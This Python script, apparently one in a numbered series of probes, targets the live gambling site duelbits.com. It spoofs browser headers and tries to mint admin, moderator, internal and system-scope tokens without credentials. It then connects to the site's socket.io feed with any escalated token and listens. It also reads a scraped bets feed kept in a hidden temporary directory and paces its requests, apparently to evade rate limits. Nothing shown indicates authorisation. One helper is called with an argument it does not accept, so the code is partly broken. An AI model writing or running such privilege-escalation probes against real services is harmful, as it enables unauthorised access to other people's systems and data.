#!/usr/bin/env python3
"""probe27: scope-privilege test at mint time (admin/mod/internal/...) + bets_live.json full keys"""
import base64
import json
import time

import requests

BASE = "https://duelbits.com"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")


def hdrs():
    return {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9", "DNT": "1",
        "sec-ch-ua": '"Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin", "Origin": BASE, "Referer": BASE + "/",
    }


def b64d(s):
    s += "=" * (-len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))


# saved feed analysis (free, local)
try:
    j = json.load(open("/dev/shm/.dkv/bets_live.json"))
    print("--- bets_live top-level keys:", list(j.keys()) if isinstance(j, dict) else type(j))
    if isinstance(j, dict):
        for k, v in j.items():
            print(f"   {k}: {type(v).__name__} len={len(v) if hasattr(v, '__len__') else '-'}")
except Exception as e:
    print("--- bets_live err", str(e)[:100])

scopes = ["admin", "mod", "internal", "system", "user"]
tokens = {}
for sc in scopes:
    try:
        r = requests.post(BASE + f"/auth/token?scope={sc}", headers=hdrs(), timeout=20)
        if r.status_code in (200, 201):
            tok = r.json().get("token", "")
            sub = b64d(tok.split(".")[1]).get("sub")
            tokens[sc] = tok
            print(f"--- mint scope={sc}: {r.status_code} sub={sub}")
        else:
            print(f"--- mint scope={sc}: {r.status_code} {r.text[:120]}")
    except Exception as e:
        print(f"--- mint scope={sc}: ERR {str(e)[:90]}")
    time.sleep(7)

# connect with the most-escalated scopes and listen
for sc in ("admin", "mod"):
    tok = tokens.get(sc)
    if not tok:
        continue
    try:
        sid = json.loads(requests.get(f"{BASE}/ws/socket.io/?EIO=4&transport=polling",
                                      headers=hdrs(), timeout=15).text[1:])["sid"]
        pr = requests.post(f"{BASE}/ws/socket.io/?EIO=4&transport=polling&sid={sid}",
                           headers=hdrs({"Content-Type": "text/plain;charset=UTF-8"}),
                           data='40{"token":"' + tok + '"}', timeout=15)
        print(f"--- [ws scope={sc}] connect:", pr.status_code, pr.text[:120])
        for i in range(2):
            time.sleep(1.5)
            try:
                gr = requests.get(f"{BASE}/ws/socket.io/?EIO=4&transport=polling&sid={sid}",
                                  headers=hdrs(), timeout=6)
                print(f"--- [ws scope={sc}] poll{i}:", gr.status_code, gr.text[:300])
            except requests.exceptions.ReadTimeout:
                print(f"--- [ws scope={sc}] poll{i}: long-poll (no data)")
    except Exception as e:
        print(f"--- [ws scope={sc}]: ERR {str(e)[:100]}")
    time.sleep(7)
